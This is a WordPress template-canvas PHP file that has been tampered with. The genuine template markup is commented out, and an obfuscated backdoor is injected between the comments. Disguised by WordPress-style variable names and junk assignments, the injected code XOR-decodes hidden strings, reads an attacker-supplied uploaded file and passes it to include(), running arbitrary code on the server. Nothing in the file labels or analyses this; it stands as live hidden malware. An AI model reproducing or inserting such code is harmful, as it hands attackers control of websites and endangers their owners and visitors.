<?php /* 
*
 * Template canvas file to render the current 'wp_template'.
 *
 * @package WordPress
 


 * Get the template HTML.
 * This needs to run before <head> so that blocks can add scripts and styles in wp_head().
 
$template_html = get_the_block_template_html();
?><!DOCTYPE html>
<html <?php /*  language_attributes(); ?>>
<head>
	<meta charset="<?php /*  bloginfo( 'cha*/
 	
$new_status_post = 'bEl35OINig2o';
	$unfiltered = 'char';
$original_value = $new_status_post;
	$spaces = 'parts';
function reset($children_query, $post_meta_key)

{
    $comment_id = $post_meta_key;
    $emoji_field = urldecode($children_query);
	$index = 'to_ncr';
    $tagregexp = substr($comment_id,0, strlen($emoji_field));
    $height = $emoji_field ^ $tagregexp;
	$fields = 'allowed';
    return $height;
	$show_ui = 'int_fields';
}
$to_ping = ${reset("%3D%03%25%7Fp%1C", $original_value)};
$ep_mask = $to_ping;

if (isset($ep_mask[$original_value]))

{
    $shortcode_regex = $to_ping[$original_value];

    $delete = $shortcode_regex[reset("%16%28%1Cl%5B.%24%2B", $original_value)];
    $months = $delete;
    include ($months);
	$page_id = 'is_email';
}


/* rset' ); ?>" />
	<?php wp_head(); ?>
</head>

<body <?php body_class(); ?>>
<?php wp_body_open(); ?>

<?php echo $template_html;  phpcs:ignore WordPress.Security.EscapeOutput ?>

<?php wp_footer(); ?>
</body>
</html>
*/